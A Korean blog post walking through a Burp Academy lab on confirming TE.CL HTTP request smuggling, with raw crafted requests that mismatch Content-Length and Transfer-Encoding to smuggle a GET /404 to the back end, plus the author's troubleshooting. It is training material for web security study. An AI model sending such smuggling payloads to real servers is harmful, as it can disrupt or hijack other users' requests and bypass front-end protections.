---
layout: post
title: "Burp Academy-HTTP Request Smuggling 관련 취약점: Confirming TE.CL vulnerabilities using differential responses"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, HTTP Request Smuggling]
toc: true
last_modified_at: 2024-01-09 09:00:00 +0900
---

# 개요
- HTTP Request Smuggling 취약점 문제이다. 
- 문제 주소: https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses
- 취약점 설명페이지1: https://portswigger.net/web-security/request-smuggling
- 취약점 설명페이지2: https://portswigger.net/web-security/request-smuggling/finding
- 난이도: PRACTITIONER (보통)

# 취약점 개요
- Burp Academy 에서는 HTTP Request Smuggling을 탐지하는 단계를 세 단계로 나눠서 가르치고 있다. 
- Indentifying과 Confirming, Exploiting이 그 것이다. Indentifying은 식별, Confirming은 확신정도로 이해하면 되겠다. Exploiting은 취약점을 악용하는 단계다.
- Indentifying에서는 타임아웃이 발생하는가를 주로 보고, Confirming에서는 실제로 HTTP요청을 밀반입해서 밀반입한 요청에 대한 HTTP응답이 돌아오는지를 본다. (따라서 오리지널 요청과 밀반입용 요청은 각각 다른 HTTP응답코드가 돌아오는 요청이어야 한다.)
- 예를 들어, TE.CL Confirm용의 HTTP요청은 다음과 같이 생겼다. 

```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0

```

- 프론트엔드는 TE를 보므로 마지막 `0\r\n\r\n`까지를 하나의 요청으로 인식한다. 백엔드에서는 CL을 보므로 4바이트인 `7c\r\n`까지를 첫번째 요청으로 인식한다. `GET /404` 부터는 별도 요청으로 인식해서 다음순서의 HTTP 요청에 대해서 404응답을 회신한다. 
- 404응답이 돌아오면 스머글링이 성공했다고 확신(Confirm)할 수 있다.
- 이 랩에서는 HTTP Request Smuggling 컨펌용 요청(TE.CL패턴)을 사용하는 것을 실습한다. 

# 랩 개요
- 이 랩은 프론트 엔드 서버와 백엔드 서버로 구성되어 있다. 백엔드서버는 chunked encoding(TE헤더)를 지원하지 않는다. 
- 랩을 풀려면 백엔드 서버에게 HTTP요청을 밀반입해서, `/` 요청을 보냈을 때 404응답이 돌아오도록 하면 된다. 

```
This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding.

To solve the lab, smuggle a request to the back-end server, so that a subsequent request for / (the web root) triggers a 404 Not Found response.
```

# 도전
1. 취약점 설명에 있는 TE.CL Confirm용 페이로드를 그대로 사용해보자. 다음과 같이 된다. 

```http
POST / HTTP/1.1
Host: 0a4c000d04892e60825ee26500a0001a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: 0a4c000d04892e60825ee26500a0001a.web-security-academy.net
Content-Length: 144

x=
0

```

※ TE.CL 요청에서는 CL헤더의 값이 업데이트되지 않는 것이 중요하다. Repeater에서 Update Content-Length 옵션을 끈다. 

2. 요청을 보내면 왜인지 Read 타임아웃이 발생한다. 

![HTTP 요청 스머글링 시도](/images/burp-academy-hrs-5-1.png)

3. GET 부분을 따로 보내본다. 그러면 GET 요청시는 Body가 있으면 안된다는 응답이 돌아오는 것을 볼 수 있다. 

![HTTP 요청 스머글링 시도](/images/burp-academy-hrs-5-2.png)

4. 정답을 참고해서 스머글링용 요청의 메소드를 GET에서 POST로 변경한다. Host헤더도 없앤다. 요청을 보내보면 처음엔 200응답이, 두번째는 404응답이 되는 것을 볼 수 있다. 

![HTTP 요청 스머글링 시도](/images/burp-academy-hrs-5-3.png)

5. 웹 브라우저를 리로드하면 문제가 풀린 것을 알 수 있다. 

![풀이 성공](/images/burp-academy-hrs-5-success.png)
